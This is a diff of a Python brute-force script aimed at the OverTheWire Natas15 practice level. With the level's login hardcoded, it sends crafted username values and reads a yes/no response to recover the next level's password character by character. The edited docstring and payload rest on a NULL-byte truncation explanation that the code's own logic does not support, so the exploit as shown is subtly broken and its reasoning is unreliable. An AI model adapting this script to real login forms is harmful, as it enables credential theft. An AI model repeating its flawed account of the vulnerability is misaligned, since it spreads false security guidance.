@@ -3,6 +3,9 @@ import requests
 import string
 import time
 
+# -----------------------------
+# CONFIG (Natas 15 only)
+# -----------------------------
 URL = "http://natas15.natas.labs.overthewire.org/index.php"
 AUTH = ("natas15", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
 
@@ -13,29 +16,41 @@ DELAY = 0.0
 
 
 def check_prefix(prefix: str) -> bool:
-    payload = f"natas16%00{prefix}"
+    """
+    Natas15 uses a restrictive alnum filter; the exploit is NULL-byte truncation.
+    IMPORTANT: send a *real* NULL byte in the POST body (not %00 text).
+    """
+    body = f"username=natas16\x00{prefix}".encode("utf-8")
+
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": str(len(body)),
+    }
+
     r = requests.post(
         URL,
         auth=AUTH,
-        data={"username": payload},
+        data=body,          # raw bytes => preserves \x00
+        headers=headers,
         timeout=10,
     )
+
     return TRUE_STRING in r.text
 
 
 def extract_password():
     extracted = ""
-
     print("[*] Starting Natas15 extraction...\n")
 
-    for position in range(1, MAX_LEN + 1):
+    for pos in range(1, MAX_LEN + 1):
         found = False
 
         for ch in CHARSET:
             test = extracted + ch
+
             if check_prefix(test):
                 extracted += ch
-                print(f"[+] Position {position}: {ch} → {extracted}")
+                print(f"[+] Position {pos}: {ch}  ->  {extracted}")
                 found = True
                 break
 
@@ -43,7 +58,7 @@ def extract_password():
                 time.sleep(DELAY)
 
         if not found:
-            print("[!] No further characters found.")
+            print("[!] No further characters found. Stopping.")
             break
 
     print("\n[✓] Password recovered:")
